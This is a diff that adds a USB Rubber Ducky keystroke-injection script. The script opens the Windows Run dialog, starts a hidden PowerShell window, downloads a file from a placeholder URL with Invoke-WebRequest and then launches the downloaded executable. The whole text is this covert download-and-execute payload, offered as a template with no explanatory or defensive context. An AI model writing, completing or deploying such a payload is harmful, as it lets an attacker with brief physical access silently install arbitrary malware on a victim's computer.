@@ -1,0 +1,15 @@
+DELAY 60000
+REM open the Run
+GUI r
+DELAY 100
+STRING powershell -windowstyle hidden
+ENTER
+DELAY 1000
+STRING $source = "File URL "; $destination = "Path\FileName"; Invoke-WebRequest $source -OutFile $destination;
+ENTER
+DELAY 5000
+STRING start-process FileName.EXE
+ENTER
+DELAY 100
+STRING exit
+ENTER
